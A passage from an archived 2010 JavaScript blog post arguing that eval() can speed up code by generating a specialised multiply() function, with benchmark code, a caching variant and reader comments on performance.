+var obj = {a:1, b:{foo:2, bar:4}, c:{quux:5, blarty:6}};
+var mul = new ReflectingMultiplier(obj, 2);
+var start = new Date();
+for(var i=0; i&amp;lt;TIMES; i++) {
+    mul.multiply();
+}
+var end = new Date();
+var time = end.getTime() - start.getTime();
+alert((1000 * time / TIMES) + &quot; microseconds average&quot;);</p></div>
+
+<p><button class="doTestReflectingMultiplier">test ReflectingMultiplier</button></p>
+<p>The problem here is that the <code>multiply()</code> method inspects the object every time it is called, even though the data object never changes. If you knew the structure of the data object in advance, you could write a much better implementation:</p>
+
+<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="javascript" style="font-family:monospace;"><span style="color: #006600; font-style: italic;">// if you know the coefficient and the structure of the data object,</span>
+<span style="color: #006600; font-style: italic;">// everything is much simpler</span>
+ReflectingMultiplier.<span style="color: #000066; font-weight: bold;">prototype</span>.<span style="color: #660066;">multiply</span> <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">function</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+    <span style="color: #000066; font-weight: bold;">this</span>.<span style="color: #660066;">data</span>.<span style="color: #660066;">a</span> <span style="color: #339933;">*=</span> <span style="color: #CC0000;">2</span><span style="color: #339933;">;</span>
+    <span style="color: #000066; font-weight: bold;">this</span>.<span style="color: #660066;">data</span>.<span style="color: #660066;">b</span>.<span style="color: #660066;">foo</span> <span style="color: #339933;">*=</span> <span style="color: #CC0000;">2</span><span style="color: #339933;">;</span>
+    <span style="color: #000066; font-weight: bold;">this</span>.<span style="color: #660066;">data</span>.<span style="color: #660066;">b</span>.<span style="color: #660066;">bar</span> <span style="color: #339933;">*=</span> <span style="color: #CC0000;">2</span><span style="color: #339933;">;</span>
+    <span style="color: #000066; font-weight: bold;">this</span>.<span style="color: #660066;">data</span>.<span style="color: #660066;">c</span>.<span style="color: #660066;">quux</span> <span style="color: #339933;">*=</span> <span style="color: #CC0000;">2</span><span style="color: #339933;">;</span>
+    <span style="color: #000066; font-weight: bold;">this</span>.<span style="color: #660066;">data</span>.<span style="color: #660066;">c</span>.<span style="color: #660066;">blarty</span> <span style="color: #339933;">*=</span> <span style="color: #CC0000;">2</span><span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span></pre></td></tr></table><p class="theCode" style="display:none;">// if you know the coefficient and the structure of the data object,
+// everything is much simpler
+ReflectingMultiplier.prototype.multiply = function() {
+    this.data.a *= 2;
+    this.data.b.foo *= 2;
+    this.data.b.bar *= 2;
+    this.data.c.quux *= 2;
+    this.data.c.blarty *= 2;
+}</p></div>
+
+<p>But you don&#8217;t know the structure in advance, so you can&#8217;t. So what&#8217;s the solution&#8230; Write a new function for every structure of data object? Well you could, but that would be a pain to maintain.</p>
+<h3>Code generation to the rescue</h3>
+<p>The solution, as you have probably guessed from the title of the article, is to inspect the data object once and generate code for an appropriate <code>multiply()</code> method. You then use <code>eval()</code> to create the method.</p>
+<div class="sidenote">
+<h3>It&#8217;s nice to have company</h3>
+<p>Robert O&#8217;Callahan at mozilla has used this technique to create a <a href="http://weblogs.mozillazine.org/roc/archives/2010/11/implementing_a.html">JIT&#8217;ed code interpreter in JavaScript</a>, which is pretty damn cool.</p>
+</div>
+<p>Here&#8217;s an implementation of the multiplier that does this:</p>
+
+<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="javascript" style="font-family:monospace;"><span style="color: #006600; font-style: italic;">// this Multiplier compiles a multiply() function in its constructor</span>
+<span style="color: #000066; font-weight: bold;">function</span> CompilingMultiplier<span style="color: #009900;">&#40;</span>data<span style="color: #339933;">,</span> coefficient<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+    <span style="color: #000066; font-weight: bold;">this</span>.<span style="color: #660066;">data</span> <span style="color: #339933;">=</span> data<span style="color: #339933;">;</span>
+    <span style="color: #006600; font-style: italic;">// compile multiply function</span>
+    <span style="color: #000066; font-weight: bold;">var</span> codeString <span style="color: #339933;">=</span> <span style="color: #3366CC;">&quot;this.multiply = function() {n&quot;</span><span style="color: #339933;">;</span>
+    <span style="color: #000066; font-weight: bold;">var</span> paths <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">this</span>.<span style="color: #660066;">getIntegerPaths</span><span style="color: #009900;">&#40;</span>data<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+    <span style="color: #000066; font-weight: bold;">for</span> <span style="color: #009900;">&#40;</span><span style="color: #000066; font-weight: bold;">var</span> i<span style="color: #339933;">=</span><span style="color: #CC0000;">0</span><span style="color: #339933;">;</span> i<span style="color: #339933;">&amp;</span>lt<span style="color: #339933;">;</span>paths.<span style="color: #660066;">length</span><span style="color: #339933;">;</span> i<span style="color: #339933;">++</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+        codeString <span style="color: #339933;">+=</span> <span style="color: #3366CC;">&quot;    this.data.&quot;</span> <span style="color: #339933;">+</span> paths<span style="color: #009900;">&#91;</span>i<span style="color: #009900;">&#93;</span>
+                   <span style="color: #339933;">+</span> <span style="color: #3366CC;">&quot; *= &quot;</span> <span style="color: #339933;">+</span> coefficient <span style="color: #339933;">+</span> <span style="color: #3366CC;">&quot;;n&quot;</span><span style="color: #339933;">;</span>
+    <span style="color: #009900;">&#125;</span>
+    codeString <span style="color: #339933;">+=</span> <span style="color: #3366CC;">&quot;}&quot;</span><span style="color: #339933;">;</span>
+    eval<span style="color: #009900;">&#40;</span>codeString<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+    <span style="color: #000066; font-weight: bold;">this</span>.<span style="color: #660066;">generatedCode</span> <span style="color: #339933;">=</span> <span style="color: #3366CC;">&quot;Generated code:nn&quot;</span> <span style="color: #339933;">+</span> codeString<span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span>
+<span style="color: #006600; font-style: italic;">// e.g. if data={a:10, subObject:{b: 11, c:&quot;foo&quot;},</span>
+<span style="color: #006600; font-style: italic;">// return [&quot;a&quot;, &quot;subObject.b&quot;]</span>
+CompilingMultiplier.<span style="color: #000066; font-weight: bold;">prototype</span>.<span style="color: #660066;">getIntegerPaths</span> <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">function</span><span style="color: #009900;">&#40;</span>data<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+    <span style="color: #000066; font-weight: bold;">var</span> paths <span style="color: #339933;">=</span> <span style="color: #009900;">&#91;</span><span style="color: #009900;">&#93;</span><span style="color: #339933;">;</span>
+    <span style="color: #000066; font-weight: bold;">this</span>._getIntegerPaths<span style="color: #009900;">&#40;</span>data<span style="color: #339933;">,</span> paths<span style="color: #339933;">,</span> <span style="color: #009900;">&#91;</span><span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+    <span style="color: #000066; font-weight: bold;">return</span> paths<span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span>
+CompilingMultiplier.<span style="color: #000066; font-weight: bold;">prototype</span>._getIntegerPaths
+                <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">function</span><span style="color: #009900;">&#40;</span>data<span style="color: #339933;">,</span> accumulator<span style="color: #339933;">,</span> stack<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+    <span style="color: #000066; font-weight: bold;">var</span> prop<span style="color: #339933;">,</span> stackPos <span style="color: #339933;">=</span> stack.<span style="color: #660066;">length</span><span style="color: #339933;">;</span>
+    <span style="color: #000066; font-weight: bold;">for</span> <span style="color: #009900;">&#40;</span>prop <span style="color: #000066; font-weight: bold;">in</span> data<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+        <span style="color: #006600; font-style: italic;">// regex to protect from code execution attacks -</span>
+        <span style="color: #006600; font-style: italic;">// only allow valid variable names</span>
+        <span style="color: #000066; font-weight: bold;">if</span> <span style="color: #009900;">&#40;</span><span style="color: #339933;">!</span>prop.<span style="color: #660066;">match</span><span style="color: #009900;">&#40;</span><span style="color: #009966; font-style: italic;">/^w+$/</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+            <span style="color: #000066; font-weight: bold;">continue</span><span style="color: #339933;">;</span>
+        <span style="color: #009900;">&#125;</span>
+        stack<span style="color: #009900;">&#91;</span>stackPos<span style="color: #009900;">&#93;</span> <span style="color: #339933;">=</span> prop<span style="color: #339933;">;</span>
+        <span style="color: #000066; font-weight: bold;">switch</span> <span style="color: #009900;">&#40;</span><span style="color: #000066; font-weight: bold;">typeof</span> data<span style="color: #009900;">&#91;</span>prop<span style="color: #009900;">&#93;</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+            <span style="color: #000066; font-weight: bold;">case</span> <span style="color: #3366CC;">&quot;number&quot;</span><span style="color: #339933;">:</span>
+                accumulator.<span style="color: #660066;">push</span><span style="color: #009900;">&#40;</span>stack.<span style="color: #660066;">join</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">&quot;.&quot;</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+                <span style="color: #000066; font-weight: bold;">break</span><span style="color: #339933;">;</span>
+            <span style="color: #000066; font-weight: bold;">case</span> <span style="color: #3366CC;">&quot;object&quot;</span><span style="color: #339933;">:</span>
+                <span style="color: #000066; font-weight: bold;">this</span>._getIntegerPaths<span style="color: #009900;">&#40;</span>data<span style="color: #009900;">&#91;</span>prop<span style="color: #009900;">&#93;</span><span style="color: #339933;">,</span> accumulator<span style="color: #339933;">,</span> stack<span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+                <span style="color: #000066; font-weight: bold;">break</span><span style="color: #339933;">;</span>
+        <span style="color: #009900;">&#125;</span>
+    <span style="color: #009900;">&#125;</span>
+    stack.<span style="color: #660066;">length</span> <span style="color: #339933;">=</span> stack.<span style="color: #660066;">length</span><span style="color: #339933;">-</span><span style="color: #CC0000;">1</span><span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span>
+<span style="color: #006600; font-style: italic;">// It would actually be more appropriate to use</span>
+<span style="color: #006600; font-style: italic;">// &quot;this.multiply = new Function(...)&quot;, which</span>
+<span style="color: #006600; font-style: italic;">// is a wrapper around eval for creating functions,</span>
+<span style="color: #006600; font-style: italic;">// but I'm trying to prove a point here :o)</span></pre></td></tr></table><p class="theCode" style="display:none;">// this Multiplier compiles a multiply() function in its constructor
+function CompilingMultiplier(data, coefficient) {
+    this.data = data;
+    // compile multiply function
+    var codeString = &quot;this.multiply = function() {n&quot;;
+    var paths = this.getIntegerPaths(data);
+    for (var i=0; i&amp;lt;paths.length; i++) {
+        codeString += &quot;    this.data.&quot; + paths[i]
+                   + &quot; *= &quot; + coefficient + &quot;;n&quot;;
+    }
+    codeString += &quot;}&quot;;
+    eval(codeString);
+    this.generatedCode = &quot;Generated code:nn&quot; + codeString;
+}
+// e.g. if data={a:10, subObject:{b: 11, c:&quot;foo&quot;},
+// return [&quot;a&quot;, &quot;subObject.b&quot;]
+CompilingMultiplier.prototype.getIntegerPaths = function(data) {
+    var paths = [];
+    this._getIntegerPaths(data, paths, []);
+    return paths;
+}
+CompilingMultiplier.prototype._getIntegerPaths
+                = function(data, accumulator, stack) {
+    var prop, stackPos = stack.length;
+    for (prop in data) {
+        // regex to protect from code execution attacks -
+        // only allow valid variable names
+        if (!prop.match(/^w+$/)) {
+            continue;
+        }
+        stack[stackPos] = prop;
+        switch (typeof data[prop]) {
+            case &quot;number&quot;:
+                accumulator.push(stack.join(&quot;.&quot;));
+                break;
+            case &quot;object&quot;:
+                this._getIntegerPaths(data[prop], accumulator, stack);
+                break;
+        }
+    }
+    stack.length = stack.length-1;
+}
+// It would actually be more appropriate to use
+// &quot;this.multiply = new Function(...)&quot;, which
+// is a wrapper around eval for creating functions,
+// but I'm trying to prove a point here :o)</p></div>
+
+<h3>Performance test</h3>
+
+<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="javascript" style="font-family:monospace;"><span style="color: #006600; font-style: italic;">// CompilingMultiplier test code:  calculate the</span>
+<span style="color: #006600; font-style: italic;">// average time taken to call multiply()</span>
+<span style="color: #000066; font-weight: bold;">var</span> TIMES <span style="color: #339933;">=</span> <span style="color: #CC0000;">1000000</span><span style="color: #339933;">;</span>
+<span style="color: #000066; font-weight: bold;">var</span> compileStart <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">new</span> <span style="">Date</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #000066; font-weight: bold;">var</span> data <span style="color: #339933;">=</span> <span style="color: #009900;">&#123;</span>a<span style="color: #339933;">:</span><span style="color: #CC0000;">1</span><span style="color: #339933;">,</span> b<span style="color: #339933;">:</span><span style="color: #009900;">&#123;</span>foo<span style="color: #339933;">:</span><span style="color: #CC0000;">2</span><span style="color: #339933;">,</span> bar<span style="color: #339933;">:</span><span style="color: #CC0000;">4</span><span style="color: #009900;">&#125;</span><span style="color: #339933;">,</span> c<span style="color: #339933;">:</span><span style="color: #009900;">&#123;</span>quux<span style="color: #339933;">:</span><span style="color: #CC0000;">5</span><span style="color: #339933;">,</span> blarty<span style="color: #339933;">:</span><span style="color: #CC0000;">6</span><span style="color: #009900;">&#125;</span><span style="color: #009900;">&#125;</span><span style="color: #339933;">;</span>
+<span style="color: #000066; font-weight: bold;">var</span> mul <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">new</span> CompilingMultiplier<span style="color: #009900;">&#40;</span>data<span style="color: #339933;">,</span> <span style="color: #CC0000;">2</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #000066; font-weight: bold;">var</span> compileEnd <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">new</span> <span style="">Date</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+&nbsp;
+<span style="color: #000066; font-weight: bold;">var</span> runStart <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">new</span> <span style="">Date</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #000066; font-weight: bold;">for</span><span style="color: #009900;">&#40;</span><span style="color: #000066; font-weight: bold;">var</span> i<span style="color: #339933;">=</span><span style="color: #CC0000;">0</span><span style="color: #339933;">;</span> i<span style="color: #339933;">&amp;</span>lt<span style="color: #339933;">;</span>TIMES<span style="color: #339933;">;</span> i<span style="color: #339933;">++</span><span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+    mul.<span style="color: #660066;">multiply</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+<span style="color: #009900;">&#125;</span>
+<span style="color: #000066; font-weight: bold;">var</span> runEnd <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">new</span> <span style="">Date</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+document.<span style="color: #660066;">getElementById</span><span style="color: #009900;">&#40;</span><span style="color: #3366CC;">'generatedCode'</span><span style="color: #009900;">&#41;</span>.<span style="color: #660066;">innerHTML</span>
+    <span style="color: #339933;">=</span> mul.<span style="color: #660066;">generatedCode</span>.<span style="color: #660066;">replace</span><span style="color: #009900;">&#40;</span><span style="color: #009966; font-style: italic;">/n/g</span><span style="color: #339933;">,</span> <span style="color: #3366CC;">&quot;&amp;lt;br&amp;gt;&quot;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span>
+alert<span style="color: #009900;">&#40;</span>
+    <span style="color: #009900;">&#40;</span>compileEnd.<span style="color: #660066;">getTime</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span> <span style="color: #339933;">-</span> compileStart.<span style="color: #660066;">getTime</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span>
+    <span style="color: #339933;">+</span> <span style="color: #3366CC;">&quot; milliseconds compilation, &quot;</span>
+    <span style="color: #339933;">+</span> <span style="color: #009900;">&#40;</span><span style="color: #CC0000;">1000</span> <span style="color: #339933;">*</span> <span style="color: #009900;">&#40;</span>runEnd.<span style="color: #660066;">getTime</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span> <span style="color: #339933;">-</span> runStart.<span style="color: #660066;">getTime</span><span style="color: #009900;">&#40;</span><span style="color: #009900;">&#41;</span><span style="color: #009900;">&#41;</span> <span style="color: #339933;">/</span> TIMES<span style="color: #009900;">&#41;</span>
+    <span style="color: #339933;">+</span> <span style="color: #3366CC;">&quot; microseconds average run time&quot;</span><span style="color: #009900;">&#41;</span><span style="color: #339933;">;</span></pre></td></tr></table><p class="theCode" style="display:none;">// CompilingMultiplier test code:  calculate the
+// average time taken to call multiply()
+var TIMES = 1000000;
+var compileStart = new Date();
+var data = {a:1, b:{foo:2, bar:4}, c:{quux:5, blarty:6}};
+var mul = new CompilingMultiplier(data, 2);
+var compileEnd = new Date();
+
+var runStart = new Date();
+for(var i=0; i&amp;lt;TIMES; i++) {
+    mul.multiply();
+}
+var runEnd = new Date();
+document.getElementById('generatedCode').innerHTML
+    = mul.generatedCode.replace(/n/g, &quot;&amp;lt;br&amp;gt;&quot;);
+alert(
+    (compileEnd.getTime() - compileStart.getTime())
+    + &quot; milliseconds compilation, &quot;
+    + (1000 * (runEnd.getTime() - runStart.getTime()) / TIMES)
+    + &quot; microseconds average run time&quot;);</p></div>
+
+<p><button class="doTestCompilingMultiplier">test CompilingMultiplier</button></p>
+<p><button class="doTestReflectingMultiplier">Remind me how long ReflectingMultiplier took</button></p>
+ 
+
+<script>
+
+
+// this Multiplier uses reflection - i.e. for (x in y) - to traverse the data object
+    function ReflectingMultiplier(data, coefficient) {
+        this.data = data;
+        this.coefficient = coefficient;
+    }
+    ReflectingMultiplier.prototype.multiply = function() {
+        this._multiply(this.data);
+    }
+    ReflectingMultiplier.prototype._multiply = function(data) {
+        var prop;
+        for (prop in data) {
+            switch (typeof data[prop]) {
+                case "number":
+                    data[prop] *= this.coefficient;
+                    break;
+                case "object":
+                    this._multiply(data[prop]);
+                    break;
+            }
+        }
+    }
+    jQuery(".doTestReflectingMultiplier").click(function() {
+        var TIMES = 100000;
+        var mul = new ReflectingMultiplier({a:1, b:{foo:2, bar:4}, c:{quux:5, blarty:6}}, 2);
+        var start = new Date();
+        for (var i=0; i<TIMES; i++) {
+             mul.multiply();
+         }
+         var end = new Date();
+         var time = end.getTime() - start.getTime();
+         alert((1000 * time / TIMES) + " microseconds average run time");
+     });
+
+// this Multiplier compiles a multiply() function in its constructor
+function CompilingMultiplier(data, coefficient) {
+    this.data = data;
+    // compile multiply function
+    var codeString = "this.multiply = function() {\n";
+    var paths = this.getIntegerPaths(data);
+    for (var i=0; i
+<paths.length; i++) {
+        codeString += "    this.data." + paths[i] + " *= " + coefficient + ";\n";
+    }
+    codeString += "}";
+    eval(codeString);
+    this.generatedCode = "Generated code:\n\n" + codeString;
+}
+// e.g. if data={a:10, subObject:{b: 11, c:"foo"}, return ["a", "subObject.b"]
+CompilingMultiplier.prototype.getIntegerPaths = function(data) {
+    var paths = [];
+    this._getIntegerPaths(data, paths, []);
+    return paths;
+}
+CompilingMultiplier.prototype._getIntegerPaths = function(data, accumulator, stack) {
+    var prop, stackPos = stack.length;
+    for (prop in data) {
+        // regex to protect from code execution attacks - only allow valid variable names
+        if (!prop.match(/^\w+$/)) {
+            continue;
+        }
+        stack[stackPos] = prop;
+        switch (typeof data[prop]) {
+            case "number":
+                accumulator.push(stack.join("."));
+                break;
+            case "object":
+                this._getIntegerPaths(data[prop], accumulator, stack);
+                break;
+        }
+    }
+    stack.length = stack.length-1;
+}
+
+
+jQuery(".doTestCompilingMultiplier").click(function() {
+    // CompilingMultiplier test code:  calculate the average time taken to call multiply()
+    var TIMES = 1000000;
+    var compileStart = new Date();
+    var mul = new CompilingMultiplier({a:1, b:{foo:2, bar:4}, c:{quux:5, blarty:6}}, 2);
+    var compileEnd = new Date();
+
+    var runStart = new Date();
+    for(var i=0; i<TIMES; i++) {
+         mul.multiply();     }
+     var runEnd = new Date();
+     document.getElementById('generatedCode').innerHTML = mul.generatedCode;
+     alert(         (compileEnd.getTime() - compileStart.getTime())         + " milliseconds compilation, "         + (1000 * (runEnd.getTime() - runStart.getTime()) / TIMES)         + " microseconds average run time");
+     });
+// ]]&gt;</script>
+
+
+<pre id="generatedCode"></pre>
+<p>Your milage may vary, but I found the compiling version to be about 5 times faster than the reflecting version.</p>
+<h3>Further optimisation</h3>
+<p>The compiling stage takes time &#8211; 850 microseconds in my tests. If you&#8217;re using <code>multiply()</code> less than 30 times for each compilation, it&#8217;s actually faster to use the reflecting version. One good way to make sure you compile as little as possible is to cache the generated functions. If you happen to know that each instance of the classes you&#8217;re using has the same internal structure, you can do this:</p>
+
+<div class="wp_syntax" style="position:relative;"><table><tr><td class="code"><pre class="javascript" style="font-family:monospace;"><span style="color: #006600; font-style: italic;">// Caching the generated function so that only one</span>
+<span style="color: #006600; font-style: italic;">// function is generated for any given class</span>
+<span style="color: #000066; font-weight: bold;">function</span> CompilingMultiplier<span style="color: #009900;">&#40;</span>data<span style="color: #339933;">,</span> coefficient<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+    <span style="color: #006600; font-style: italic;">// every object has a hidden member variable 'constructor',</span>
+    <span style="color: #006600; font-style: italic;">// which is a reference to its constructor function that</span>
+    <span style="color: #006600; font-style: italic;">// doesn't show up in a for(x in y) loop.</span>
+    <span style="color: #000066; font-weight: bold;">if</span> <span style="color: #009900;">&#40;</span>data.<span style="color: #660066;">constructor</span>.__multiplierCache<span style="color: #009900;">&#41;</span> <span style="color: #009900;">&#123;</span>
+        <span style="color: #000066; font-weight: bold;">this</span>.<span style="color: #660066;">multiplier</span> <span style="color: #339933;">=</span> data.<span style="color: #660066;">constructor</span>.__multiplierCache<span style="color: #339933;">;</span>
+    <span style="color: #009900;">&#125;</span> <span style="color: #000066; font-weight: bold;">else</span> <span style="color: #009900;">&#123;</span>
+        ... <span style="color: #660066;">compile</span> <span style="color: #000066; font-weight: bold;">this</span>.<span style="color: #660066;">multiply</span> <span style="color: #000066; font-weight: bold;">function</span> ...
+        <span style="color: #660066;">data</span>.<span style="color: #660066;">constructor</span>.__multiplierCache <span style="color: #339933;">=</span> <span style="color: #000066; font-weight: bold;">this</span>.<span style="color: #660066;">multiply</span><span style="color: #339933;">;</span>
+    <span style="color: #009900;">&#125;</span>
+<span style="color: #009900;">&#125;</span></pre></td></tr></table><p class="theCode" style="display:none;">// Caching the generated function so that only one
+// function is generated for any given class
+function CompilingMultiplier(data, coefficient) {
+    // every object has a hidden member variable 'constructor',
+    // which is a reference to its constructor function that
+    // doesn't show up in a for(x in y) loop.
+    if (data.constructor.__multiplierCache) {
+        this.multiplier = data.constructor.__multiplierCache;
+    } else {
+        ... compile this.multiply function ...
+        data.constructor.__multiplierCache = this.multiply;
+    }
+}</p></div>
+
+<h2>In summary</h2>
+<p>Use this technique when&#8230;</p>
+<ul>
+<li>you have a loop that runs many times and/or a recursive algorithm, and most of the time is spent managing loop variables and function calls rather than doing useful work.</li>
+<li>you are inspecting a structure before using it, and you know that the structure isn&#8217;t going to change.</li>
+<li>you can&#8217;t see any easier ways of optimising the loop.</li>
+</ul>
+<p>Good luck!</p>
+	</div><!-- .entry-content -->
+
+	
+	<footer class="entry-footer">
+		<span class="posted-on"><span class="screen-reader-text">Posted on </span><a href="index.html" rel="bookmark"><time class="entry-date published" datetime="2010-09-30T05:09:29+00:00">30th September 2010</time><time class="updated" datetime="2019-10-17T08:06:40+00:00">17th October 2019</time></a></span><span class="byline"><span class="author vcard"><span class="screen-reader-text">Author </span><a class="url fn n" href="../../author/bernie/index.html">bernie</a></span></span><span class="cat-links"><span class="screen-reader-text">Categories </span><a href="../../category/software/index.html" rel="category tag">Software</a></span>			</footer><!-- .entry-footer -->
+
+</article><!-- #post-## -->
+
+<div id="comments" class="comments-area">
+
+			<h2 class="comments-title">
+			15 thoughts on &ldquo;eval() considered useful: code generation in JavaScript&rdquo;		</h2>
+
+		
+		<ol class="comment-list">
+					<li id="comment-171" class="comment even thread-even depth-1">
+			<article id="div-comment-171" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/ef104096f0a3275e6801c548296f94ab?s=56&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/ef104096f0a3275e6801c548296f94ab?s=112&#038;d=mm&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' />						<b class="fn"><a href='http://www.timsworlds.com/' rel='external nofollow' class='url'>Tim</a></b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-171">
+							<time datetime="2007-03-31T15:25:38+00:00">
+								31st March 2007 at 3:25 pm							</time>
+						</a>
+											</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>Good article, Bernie.  I had run across Doug&#8217;s comments about eval on his jslint page, and considered them for a while, but there are some things you just have to use it for.  It&#8217;s in the language for a reason, and the language wasn&#8217;t invented by dummies (even though it&#8217;s a bit quirky and they probably made a few mistakes in its definition). To declare eval evil because bad programmers use it badly, you&#8217;d also have to declare that looping is evil because bad programmers use it badly&#8230;  etc.</p>
+<p>It&#8217;s good to see you paying attention to performance issues in Javascript.  IMO, too little attention is given to that subject, but in Javascript, it&#8217;s even more important to pay careful attention to that stuff.  I&#8217;ve been thinking about some subjects for a &#8220;High Performance Javascript&#8221; article.  Stuff like: a.b[i].c.d.f{&#8216;name&#8217;} is slow (and dangerous).  Cache a.b[i].c.d.f if you&#8217;re going to access that object than once&#8230;  just how slow is b[i]&#8230; how slow is string concatentation&#8230;   performance characteristics of regular expressions&#8230; blah, blah&#8230;</p>
+				</div><!-- .comment-content -->
+
+							</article><!-- .comment-body -->
+</li><!-- #comment-## -->
+		<li id="comment-172" class="comment odd alt thread-odd thread-alt depth-1 parent">
+			<article id="div-comment-172" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/dc4bea5d8218ffd142a685fc9a948804?s=56&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/dc4bea5d8218ffd142a685fc9a948804?s=112&#038;d=mm&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' />						<b class="fn"><a href='http://berniecode.com/' rel='external nofollow' class='url'>bernie</a></b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-172">
+							<time datetime="2007-04-01T14:35:34+00:00">
+								1st April 2007 at 2:35 pm							</time>
+						</a>
+											</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>You&#8217;re right, performance in JS is overlooked, perhaps because developers tend to have fast machines (and also because slow code makes their user’s computers crawl, not the server: it might be slow but the slowness in infinitely scalable :o)</p>
+<p>A couple of links to articles about optimisation:</p>
+<p>	This <a href="http://home.earthlink.net/~kendrasg/info/js_opt/jsOptMain.html" rel="nofollow">old but classic article</a> introduces many useful and sometimes counterintuitive loop optimisations, though it&#8217;s age is showing &#8211; it contains nothing on the new generation of browsers, and nothing on object-oriented JavaScript.</p>
+<p>	This <a href="http://blogs.msdn.com/ie/archive/2006/08/28/728654.aspx" rel="nofollow">three</a>  <a href="http://blogs.msdn.com/ie/archive/2006/11/16/ie-javascript-performance-recommendations-part-2-javascript-code-inefficiencies.aspx" rel="nofollow">part</a> <a href="http://blogs.msdn.com/ie/archive/2007/01/04/ie-jscript-performance-recommendations-part-3-javascript-code-inefficiencies.aspx" rel="nofollow">article</a> from MSDN is a treasure trove of IE-specific tips, but watch out because the second &#8220;Cache Function Pointers at all costs&#8221; example will actually break non IE browsers.</p>
+<p>I think there&#8217;s scope for an up to date compendium of tips. What would the ideal format be, a wiki?</p>
+				</div><!-- .comment-content -->
+
+							</article><!-- .comment-body -->
+<ol class="children">
+		<li id="comment-185" class="comment even depth-2">
+			<article id="div-comment-185" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
+						<img alt='' src='https://secure.gravatar.com/avatar/834d6158834126eed00025118c9d2396?s=56&amp;d=mm&amp;r=g' srcset='https://secure.gravatar.com/avatar/834d6158834126eed00025118c9d2396?s=112&#038;d=mm&#038;r=g 2x' class='avatar avatar-56 photo' height='56' width='56' />						<b class="fn">Apostrophe OCD</b> <span class="says">says:</span>					</div><!-- .comment-author -->
+
+					<div class="comment-metadata">
+						<a href="index.html#comment-185">
+							<time datetime="2012-05-19T20:19:19+00:00">
+								19th May 2012 at 8:19 pm							</time>
+						</a>
+											</div><!-- .comment-metadata -->
+
+									</footer><!-- .comment-meta -->
+
+				<div class="comment-content">
+					<p>There you wrote about an old but classicle article introducing many useful optimixations though it is age is showing.  Even eval() could not parse it.</p>
+				</div><!-- .comment-content -->
+
+							</article><!-- .comment-body -->
+</li><!-- #comment-## -->
+</ol><!-- .children -->
+</li><!-- #comment-## -->
+		<li id="comment-173" class="comment odd alt thread-even depth-1">
+			<article id="div-comment-173" class="comment-body">
+				<footer class="comment-meta">
+					<div class="comment-author vcard">
